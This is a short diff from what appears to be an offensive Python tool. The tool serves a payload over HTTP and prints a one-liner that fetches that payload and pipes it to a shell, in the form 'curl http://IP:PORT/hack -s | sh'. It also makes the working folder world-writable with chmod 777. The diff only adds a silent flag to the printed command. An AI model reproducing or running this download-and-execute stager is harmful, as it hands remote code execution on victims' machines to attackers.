@@ -89,6 +89,6 @@ if __name__ == "__main__":
     os.popen("chmod -R 777 .")
     IP = sys.argv[1]
     PORT = sys.argv[2]
-    print("[+] curl http://{}:{}/hack | sh".format(IP, PORT))
+    print("[+] curl http://{}:{}/hack -s | sh".format(IP, PORT))
     app.run(host="0.0.0.0", port=PORT)
     
